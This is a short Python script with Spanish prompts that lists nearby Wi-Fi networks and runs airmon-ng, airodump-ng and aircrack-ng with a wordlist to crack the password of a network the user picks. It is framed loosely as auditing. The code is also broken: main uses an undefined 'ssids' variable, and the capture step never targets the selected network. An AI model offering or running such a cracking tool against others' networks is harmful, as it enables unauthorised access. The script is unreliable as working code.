import os
import subprocess
import re
import time
import signal

def display_banner():
    banner = """
██████╗ ███████╗████████╗██████╗  █████╗
██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
███████║███████╗   ██║   ██████╔╝███████║
██╔══██║╚════██║   ██║   ██╔══██╗██╔══██║
██║  ██║███████║   ██║   ██║  ██║██║  ██║
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
    """
    print(banner)

def scan_networks():
    print("\nEscaneando redes Wi-Fi...")
    networks = subprocess.check_output(["iwlist", "wlan0", "scan"], universal_newlines=True)
    ssids = re.findall(r"ESSID:\"(.*?)\"", networks)
    
    if ssids:
        print("\nRedes encontradas:")
        for i, ssid in enumerate(ssids, 1):
            print(f"{i}. {ssid}")
    else:
        print("No se encontraron redes Wi-Fi.")

def crack_password(network_name):
    print(f"\nCrackeando red: {network_name}")
    print("Este proceso puede llevar tiempo...")
    
    try:
        subprocess.run(["airmon-ng", "start", "wlan0"])
        subprocess.run(["airodump-ng", f"wlan0mon", "-c", "6", "--write", "capture"], timeout=60)
        subprocess.run(["aircrack-ng", "-w", "passwords.txt", "capture-01.cap"])
    except KeyboardInterrupt:
        print("\nProceso cancelado por el usuario.")
    finally:
        subprocess.run(["airmon-ng", "stop", "wlan0mon"])

def main():
    display_banner()
    scan_networks()
    
    try:
        choice = int(input("\nIngrese el número de la red para auditar o presione Ctrl+C para salir: "))
        selected_network = ssids[choice - 1]
        crack_password(selected_network)
    except (IndexError, ValueError):
        print("Opción inválida o interrumpida por el usuario.")
    except KeyboardInterrupt:
        print("\nProceso interrumpido por el usuario.")

if __name__ == "__main__":
    main()
